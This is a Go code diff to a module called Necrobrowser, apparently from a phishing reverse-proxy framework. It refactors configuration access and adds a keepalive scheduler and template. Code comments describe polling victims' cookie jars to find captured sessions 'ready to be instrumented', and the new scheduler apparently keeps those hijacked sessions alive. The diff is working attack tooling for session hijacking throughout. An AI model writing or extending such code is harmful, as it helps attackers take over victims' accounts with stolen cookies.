@@ -37,7 +37,8 @@ type Necrobrowser struct {
 	Endpoint string
 	Profile  string
 
-	RequestTemplate string
+	RequestTemplate   string
+	KeepaliveTemplate string
 }
 
 // SessionCookie structure
@@ -84,7 +85,7 @@ func Load(s *session.Session) (m *Necrobrowser, err error) {
 
 	m = &Necrobrowser{
 		SessionModule: session.NewSessionModule(Name, s),
-		Enabled:       s.Config.Necrobrowser.Enabled,
+		Enabled:       s.Config().Necrobrowser.Enabled,
 	}
 
 	if !m.Enabled {
@@ -92,7 +93,7 @@ func Load(s *session.Session) (m *Necrobrowser, err error) {
 		return
 	}
 
-	config := s.Config.Necrobrowser
+	config := s.Config().Necrobrowser
 	m.Endpoint = config.Endpoint
 
 	m.Profile = config.Profile
@@ -107,19 +108,35 @@ func Load(s *session.Session) (m *Necrobrowser, err error) {
 
 	// spawn a go routine that checks all the victims cookie jars every N seconds
 	// to see if we have any sessions ready to be instrumented
-	if s.Config.Necrobrowser.Enabled {
+	if s.Config().Necrobrowser.Enabled {
 		m.Info("enabled")
 		go m.CheckSessions()
 
-		m.Info("trigger delay every %d seconds", s.Config.Necrobrowser.Trigger.Delay)
+		m.Info("trigger delay every %d seconds", s.Config().Necrobrowser.Trigger.Delay)
+	}
+
+	if s.Config().Necrobrowser.Keepalive.Enable {
+		kp := s.Config().Necrobrowser.Keepalive.Profile
+		if kp != "" {
+			if kb, err := ioutil.ReadFile(kp); err == nil {
+				m.KeepaliveTemplate = string(kb)
+			} else {
+				m.Warning("cannot read keepalive profile %s: %s", kp, err)
+			}
+		}
+		if m.KeepaliveTemplate == "" {
+			m.KeepaliveTemplate = m.RequestTemplate // fall back to the instrument template
+		}
+		go m.RunKeepaliveScheduler()
+		m.Info("keepalive scheduler started")
 	}
 
 	return
 }
 
 func (module *Necrobrowser) CheckSessions() {
-	triggerType := module.Session.Config.Necrobrowser.Trigger.Type
-	triggerDelay := module.Session.Config.Necrobrowser.Trigger.Delay
+	triggerType := module.Session.Config().Necrobrowser.Trigger.Type
+	triggerDelay := module.Session.Config().Necrobrowser.Trigger.Delay
 
 	for {
 		switch triggerType {
@@ -136,7 +153,7 @@ func (module *Necrobrowser) CheckSessions() {
 }
 
 func (module *Necrobrowser) CheckSessionCookies() {
-	triggerValues := module.Session.Config.Necrobrowser.Trigger.Values
+	triggerValues := module.Session.Config().Necrobrowser.Trigger.Values
 
 	victims, err := db.GetAllVictims()
 	if err != nil {
